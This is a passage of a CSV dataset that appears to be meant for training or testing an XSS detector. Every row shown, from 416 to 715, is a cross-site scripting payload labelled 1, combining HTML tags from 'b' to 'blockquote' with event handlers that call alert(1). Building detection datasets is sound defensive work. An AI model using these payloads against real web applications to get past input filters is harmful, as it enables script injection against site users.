,Sentence,Label
416,"<b onpointerenter=alert(1)>XSS</b>
",1
417,"<b onpointerleave=alert(1)>XSS</b>
",1
418,"<b onpointermove=alert(1)>XSS</b>
",1
419,"<b onpointerout=alert(1)>XSS</b>
",1
420,"<b onpointerover=alert(1)>XSS</b>
",1
421,"<b onpointerup=alert(1)>XSS</b>
",1
422,"<base draggable=""true"" ondrag=""alert(1)"">test</base>
",1
423,"<base draggable=""true"" ondragend=""alert(1)"">test</base>
",1
424,"<base draggable=""true"" ondragenter=""alert(1)"">test</base>
",1
425,"<base draggable=""true"" ondragleave=""alert(1)"">test</base>
",1
426,"<base draggable=""true"" ondragstart=""alert(1)"">test</base>
",1
427,"<base id=x tabindex=1 onactivate=alert(1)></base>
",1
428,"<base id=x tabindex=1 onbeforeactivate=alert(1)></base>
",1
429,"<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>
",1
430,"<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>
",1
431,"<base id=x tabindex=1 onfocus=alert(1)></base>
",1
432,"<base id=x tabindex=1 onfocusin=alert(1)></base>
",1
433,"<base onbeforecopy=""alert(1)"" contenteditable>test</base>
",1
434,"<base onbeforecut=""alert(1)"" contenteditable>test</base>
",1
435,"<base onbeforepaste=""alert(1)"" contenteditable>test</base>
",1
436,"<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
",1
437,"<base onclick=""alert(1)"">test</base>
",1
438,"<base oncontextmenu=""alert(1)"">test</base>
",1
439,"<base oncopy=""alert(1)"" contenteditable>test</base>
",1
440,"<base oncut=""alert(1)"" contenteditable>test</base>
",1
441,"<base ondblclick=""alert(1)"">test</base>
",1
442,"<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>
",1
443,"<base onkeydown=""alert(1)"" contenteditable>test</base>
",1
444,"<base onkeypress=""alert(1)"" contenteditable>test</base>
",1
445,"<base onkeyup=""alert(1)"" contenteditable>test</base>
",1
446,"<base onmousedown=""alert(1)"">test</base>
",1
447,"<base onmouseenter=""alert(1)"">test</base>
",1
448,"<base onmouseleave=""alert(1)"">test</base>
",1
449,"<base onmousemove=""alert(1)"">test</base>
",1
450,"<base onmouseout=""alert(1)"">test</base>
",1
451,"<base onmouseover=""alert(1)"">test</base>
",1
452,"<base onmouseup=""alert(1)"">test</base>
",1
453,"<base onpaste=""alert(1)"" contenteditable>test</base>
",1
454,"<base onpointerdown=alert(1)>XSS</base>
",1
455,"<base onpointerenter=alert(1)>XSS</base>
",1
456,"<base onpointerleave=alert(1)>XSS</base>
",1
457,"<base onpointermove=alert(1)>XSS</base>
",1
458,"<base onpointerout=alert(1)>XSS</base>
",1
459,"<base onpointerover=alert(1)>XSS</base>
",1
460,"<base onpointerup=alert(1)>XSS</base>
",1
461,"<basefont draggable=""true"" ondrag=""alert(1)"">test</basefont>
",1
462,"<basefont draggable=""true"" ondragend=""alert(1)"">test</basefont>
",1
463,"<basefont draggable=""true"" ondragenter=""alert(1)"">test</basefont>
",1
464,"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>
",1
465,"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>
",1
466,"<basefont id=x tabindex=1 onactivate=alert(1)></basefont>
",1
467,"<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>
",1
468,"<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>
",1
469,"<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
",1
470,"<basefont id=x tabindex=1 onfocus=alert(1)></basefont>
",1
471,"<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>
",1
472,"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>
",1
473,"<basefont onbeforecut=""alert(1)"" contenteditable>test</basefont>
",1
474,"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>
",1
475,"<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>
",1
476,"<basefont onclick=""alert(1)"">test</basefont>
",1
477,"<basefont oncontextmenu=""alert(1)"">test</basefont>
",1
478,"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>
",1
479,"<basefont oncut=""alert(1)"" contenteditable>test</basefont>
",1
480,"<basefont ondblclick=""alert(1)"">test</basefont>
",1
481,"<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
",1
482,"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>
",1
483,"<basefont onkeypress=""alert(1)"" contenteditable>test</basefont>
",1
484,"<basefont onkeyup=""alert(1)"" contenteditable>test</basefont>
",1
485,"<basefont onmousedown=""alert(1)"">test</basefont>
",1
486,"<basefont onmouseenter=""alert(1)"">test</basefont>
",1
487,"<basefont onmouseleave=""alert(1)"">test</basefont>
",1
488,"<basefont onmousemove=""alert(1)"">test</basefont>
",1
489,"<basefont onmouseout=""alert(1)"">test</basefont>
",1
490,"<basefont onmouseover=""alert(1)"">test</basefont>
",1
491,"<basefont onmouseup=""alert(1)"">test</basefont>
",1
492,"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>
",1
493,"<basefont onpointerdown=alert(1)>XSS</basefont>
",1
494,"<basefont onpointerenter=alert(1)>XSS</basefont>
",1
495,"<basefont onpointerleave=alert(1)>XSS</basefont>
",1
496,"<basefont onpointermove=alert(1)>XSS</basefont>
",1
497,"<basefont onpointerout=alert(1)>XSS</basefont>
",1
498,"<basefont onpointerover=alert(1)>XSS</basefont>
",1
499,"<basefont onpointerup=alert(1)>XSS</basefont>
",1
500,"<bdi draggable=""true"" ondrag=""alert(1)"">test</bdi>
",1
501,"<bdi draggable=""true"" ondragend=""alert(1)"">test</bdi>
",1
502,"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>
",1
503,"<bdi draggable=""true"" ondragleave=""alert(1)"">test</bdi>
",1
504,"<bdi draggable=""true"" ondragstart=""alert(1)"">test</bdi>
",1
505,"<bdi id=x tabindex=1 onactivate=alert(1)></bdi>
",1
506,"<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>
",1
507,"<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>
",1
508,"<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>
",1
509,"<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
",1
510,"<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
",1
511,"<bdi onbeforecopy=""alert(1)"" contenteditable>test</bdi>
",1
512,"<bdi onbeforecut=""alert(1)"" contenteditable>test</bdi>
",1
513,"<bdi onbeforepaste=""alert(1)"" contenteditable>test</bdi>
",1
514,"<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>
",1
515,"<bdi onclick=""alert(1)"">test</bdi>
",1
516,"<bdi oncontextmenu=""alert(1)"">test</bdi>
",1
517,"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>
",1
518,"<bdi oncut=""alert(1)"" contenteditable>test</bdi>
",1
519,"<bdi ondblclick=""alert(1)"">test</bdi>
",1
520,"<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>
",1
521,"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>
",1
522,"<bdi onkeypress=""alert(1)"" contenteditable>test</bdi>
",1
523,"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>
",1
524,"<bdi onmousedown=""alert(1)"">test</bdi>
",1
525,"<bdi onmouseenter=""alert(1)"">test</bdi>
",1
526,"<bdi onmouseleave=""alert(1)"">test</bdi>
",1
527,"<bdi onmousemove=""alert(1)"">test</bdi>
",1
528,"<bdi onmouseout=""alert(1)"">test</bdi>
",1
529,"<bdi onmouseover=""alert(1)"">test</bdi>
",1
530,"<bdi onmouseup=""alert(1)"">test</bdi>
",1
531,"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>
",1
532,"<bdi onpointerdown=alert(1)>XSS</bdi>
",1
533,"<bdi onpointerenter=alert(1)>XSS</bdi>
",1
534,"<bdi onpointerleave=alert(1)>XSS</bdi>
",1
535,"<bdi onpointermove=alert(1)>XSS</bdi>
",1
536,"<bdi onpointerout=alert(1)>XSS</bdi>
",1
537,"<bdi onpointerover=alert(1)>XSS</bdi>
",1
538,"<bdi onpointerup=alert(1)>XSS</bdi>
",1
539,"<bdo draggable=""true"" ondrag=""alert(1)"">test</bdo>
",1
540,"<bdo draggable=""true"" ondragend=""alert(1)"">test</bdo>
",1
541,"<bdo draggable=""true"" ondragenter=""alert(1)"">test</bdo>
",1
542,"<bdo draggable=""true"" ondragleave=""alert(1)"">test</bdo>
",1
543,"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>
",1
544,"<bdo id=x tabindex=1 onactivate=alert(1)></bdo>
",1
545,"<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
",1
546,"<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>
",1
547,"<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>
",1
548,"<bdo id=x tabindex=1 onfocus=alert(1)></bdo>
",1
549,"<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
",1
550,"<bdo onbeforecopy=""alert(1)"" contenteditable>test</bdo>
",1
551,"<bdo onbeforecut=""alert(1)"" contenteditable>test</bdo>
",1
552,"<bdo onbeforepaste=""alert(1)"" contenteditable>test</bdo>
",1
553,"<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>
",1
554,"<bdo onclick=""alert(1)"">test</bdo>
",1
555,"<bdo oncontextmenu=""alert(1)"">test</bdo>
",1
556,"<bdo oncopy=""alert(1)"" contenteditable>test</bdo>
",1
557,"<bdo oncut=""alert(1)"" contenteditable>test</bdo>
",1
558,"<bdo ondblclick=""alert(1)"">test</bdo>
",1
559,"<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>
",1
560,"<bdo onkeydown=""alert(1)"" contenteditable>test</bdo>
",1
561,"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>
",1
562,"<bdo onkeyup=""alert(1)"" contenteditable>test</bdo>
",1
563,"<bdo onmousedown=""alert(1)"">test</bdo>
",1
564,"<bdo onmouseenter=""alert(1)"">test</bdo>
",1
565,"<bdo onmouseleave=""alert(1)"">test</bdo>
",1
566,"<bdo onmousemove=""alert(1)"">test</bdo>
",1
567,"<bdo onmouseout=""alert(1)"">test</bdo>
",1
568,"<bdo onmouseover=""alert(1)"">test</bdo>
",1
569,"<bdo onmouseup=""alert(1)"">test</bdo>
",1
570,"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>
",1
571,"<bdo onpointerdown=alert(1)>XSS</bdo>
",1
572,"<bdo onpointerenter=alert(1)>XSS</bdo>
",1
573,"<bdo onpointerleave=alert(1)>XSS</bdo>
",1
574,"<bdo onpointermove=alert(1)>XSS</bdo>
",1
575,"<bdo onpointerout=alert(1)>XSS</bdo>
",1
576,"<bdo onpointerover=alert(1)>XSS</bdo>
",1
577,"<bdo onpointerup=alert(1)>XSS</bdo>
",1
578,"<bgsound draggable=""true"" ondrag=""alert(1)"">test</bgsound>
",1
579,"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>
",1
580,"<bgsound draggable=""true"" ondragenter=""alert(1)"">test</bgsound>
",1
581,"<bgsound draggable=""true"" ondragleave=""alert(1)"">test</bgsound>
",1
582,"<bgsound draggable=""true"" ondragstart=""alert(1)"">test</bgsound>
",1
583,"<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
",1
584,"<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>
",1
585,"<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>
",1
586,"<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>
",1
587,"<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
",1
588,"<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>
",1
589,"<bgsound onbeforecopy=""alert(1)"" contenteditable>test</bgsound>
",1
590,"<bgsound onbeforecut=""alert(1)"" contenteditable>test</bgsound>
",1
591,"<bgsound onbeforepaste=""alert(1)"" contenteditable>test</bgsound>
",1
592,"<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
",1
593,"<bgsound onclick=""alert(1)"">test</bgsound>
",1
594,"<bgsound oncontextmenu=""alert(1)"">test</bgsound>
",1
595,"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>
",1
596,"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>
",1
597,"<bgsound ondblclick=""alert(1)"">test</bgsound>
",1
598,"<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
",1
599,"<bgsound onkeydown=""alert(1)"" contenteditable>test</bgsound>
",1
600,"<bgsound onkeypress=""alert(1)"" contenteditable>test</bgsound>
",1
601,"<bgsound onkeyup=""alert(1)"" contenteditable>test</bgsound>
",1
602,"<bgsound onmousedown=""alert(1)"">test</bgsound>
",1
603,"<bgsound onmouseenter=""alert(1)"">test</bgsound>
",1
604,"<bgsound onmouseleave=""alert(1)"">test</bgsound>
",1
605,"<bgsound onmousemove=""alert(1)"">test</bgsound>
",1
606,"<bgsound onmouseout=""alert(1)"">test</bgsound>
",1
607,"<bgsound onmouseover=""alert(1)"">test</bgsound>
",1
608,"<bgsound onmouseup=""alert(1)"">test</bgsound>
",1
609,"<bgsound onpaste=""alert(1)"" contenteditable>test</bgsound>
",1
610,"<bgsound onpointerdown=alert(1)>XSS</bgsound>
",1
611,"<bgsound onpointerenter=alert(1)>XSS</bgsound>
",1
612,"<bgsound onpointerleave=alert(1)>XSS</bgsound>
",1
613,"<bgsound onpointermove=alert(1)>XSS</bgsound>
",1
614,"<bgsound onpointerout=alert(1)>XSS</bgsound>
",1
615,"<bgsound onpointerover=alert(1)>XSS</bgsound>
",1
616,"<bgsound onpointerup=alert(1)>XSS</bgsound>
",1
617,"<big draggable=""true"" ondrag=""alert(1)"">test</big>
",1
618,"<big draggable=""true"" ondragend=""alert(1)"">test</big>
",1
619,"<big draggable=""true"" ondragenter=""alert(1)"">test</big>
",1
620,"<big draggable=""true"" ondragleave=""alert(1)"">test</big>
",1
621,"<big draggable=""true"" ondragstart=""alert(1)"">test</big>
",1
622,"<big id=x tabindex=1 onactivate=alert(1)></big>
",1
623,"<big id=x tabindex=1 onbeforeactivate=alert(1)></big>
",1
624,"<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>
",1
625,"<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>
",1
626,"<big id=x tabindex=1 onfocus=alert(1)></big>
",1
627,"<big id=x tabindex=1 onfocusin=alert(1)></big>
",1
628,"<big onbeforecopy=""alert(1)"" contenteditable>test</big>
",1
629,"<big onbeforecut=""alert(1)"" contenteditable>test</big>
",1
630,"<big onbeforepaste=""alert(1)"" contenteditable>test</big>
",1
631,"<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>
",1
632,"<big onclick=""alert(1)"">test</big>
",1
633,"<big oncontextmenu=""alert(1)"">test</big>
",1
634,"<big oncopy=""alert(1)"" contenteditable>test</big>
",1
635,"<big oncut=""alert(1)"" contenteditable>test</big>
",1
636,"<big ondblclick=""alert(1)"">test</big>
",1
637,"<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>
",1
638,"<big onkeydown=""alert(1)"" contenteditable>test</big>
",1
639,"<big onkeypress=""alert(1)"" contenteditable>test</big>
",1
640,"<big onkeyup=""alert(1)"" contenteditable>test</big>
",1
641,"<big onmousedown=""alert(1)"">test</big>
",1
642,"<big onmouseenter=""alert(1)"">test</big>
",1
643,"<big onmouseleave=""alert(1)"">test</big>
",1
644,"<big onmousemove=""alert(1)"">test</big>
",1
645,"<big onmouseout=""alert(1)"">test</big>
",1
646,"<big onmouseover=""alert(1)"">test</big>
",1
647,"<big onmouseup=""alert(1)"">test</big>
",1
648,"<big onpaste=""alert(1)"" contenteditable>test</big>
",1
649,"<big onpointerdown=alert(1)>XSS</big>
",1
650,"<big onpointerenter=alert(1)>XSS</big>
",1
651,"<big onpointerleave=alert(1)>XSS</big>
",1
652,"<big onpointermove=alert(1)>XSS</big>
",1
653,"<big onpointerout=alert(1)>XSS</big>
",1
654,"<big onpointerover=alert(1)>XSS</big>
",1
655,"<big onpointerup=alert(1)>XSS</big>
",1
656,"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>
",1
657,"<blink draggable=""true"" ondragend=""alert(1)"">test</blink>
",1
658,"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>
",1
659,"<blink draggable=""true"" ondragleave=""alert(1)"">test</blink>
",1
660,"<blink draggable=""true"" ondragstart=""alert(1)"">test</blink>
",1
661,"<blink id=x tabindex=1 onactivate=alert(1)></blink>
",1
662,"<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>
",1
663,"<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>
",1
664,"<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>
",1
665,"<blink id=x tabindex=1 onfocus=alert(1)></blink>
",1
666,"<blink id=x tabindex=1 onfocusin=alert(1)></blink>
",1
667,"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>
",1
668,"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>
",1
669,"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>
",1
670,"<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>
",1
671,"<blink onclick=""alert(1)"">test</blink>
",1
672,"<blink oncontextmenu=""alert(1)"">test</blink>
",1
673,"<blink oncopy=""alert(1)"" contenteditable>test</blink>
",1
674,"<blink oncut=""alert(1)"" contenteditable>test</blink>
",1
675,"<blink ondblclick=""alert(1)"">test</blink>
",1
676,"<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>
",1
677,"<blink onkeydown=""alert(1)"" contenteditable>test</blink>
",1
678,"<blink onkeypress=""alert(1)"" contenteditable>test</blink>
",1
679,"<blink onkeyup=""alert(1)"" contenteditable>test</blink>
",1
680,"<blink onmousedown=""alert(1)"">test</blink>
",1
681,"<blink onmouseenter=""alert(1)"">test</blink>
",1
682,"<blink onmouseleave=""alert(1)"">test</blink>
",1
683,"<blink onmousemove=""alert(1)"">test</blink>
",1
684,"<blink onmouseout=""alert(1)"">test</blink>
",1
685,"<blink onmouseover=""alert(1)"">test</blink>
",1
686,"<blink onmouseup=""alert(1)"">test</blink>
",1
687,"<blink onpaste=""alert(1)"" contenteditable>test</blink>
",1
688,"<blink onpointerdown=alert(1)>XSS</blink>
",1
689,"<blink onpointerenter=alert(1)>XSS</blink>
",1
690,"<blink onpointerleave=alert(1)>XSS</blink>
",1
691,"<blink onpointermove=alert(1)>XSS</blink>
",1
692,"<blink onpointerout=alert(1)>XSS</blink>
",1
693,"<blink onpointerover=alert(1)>XSS</blink>
",1
694,"<blink onpointerup=alert(1)>XSS</blink>
",1
695,"<blockquote draggable=""true"" ondrag=""alert(1)"">test</blockquote>
",1
696,"<blockquote draggable=""true"" ondragend=""alert(1)"">test</blockquote>
",1
697,"<blockquote draggable=""true"" ondragenter=""alert(1)"">test</blockquote>
",1
698,"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>
",1
699,"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>
",1
700,"<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>
",1
701,"<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>
",1
702,"<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>
",1
703,"<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>
",1
704,"<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>
",1
705,"<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
",1
706,"<blockquote onbeforecopy=""alert(1)"" contenteditable>test</blockquote>
",1
707,"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>
",1
708,"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>
",1
709,"<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>
",1
710,"<blockquote onclick=""alert(1)"">test</blockquote>
",1
711,"<blockquote oncontextmenu=""alert(1)"">test</blockquote>
",1
712,"<blockquote oncopy=""alert(1)"" contenteditable>test</blockquote>
",1
713,"<blockquote oncut=""alert(1)"" contenteditable>test</blockquote>
",1
714,"<blockquote ondblclick=""alert(1)"">test</blockquote>
",1
715,"<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>
",1
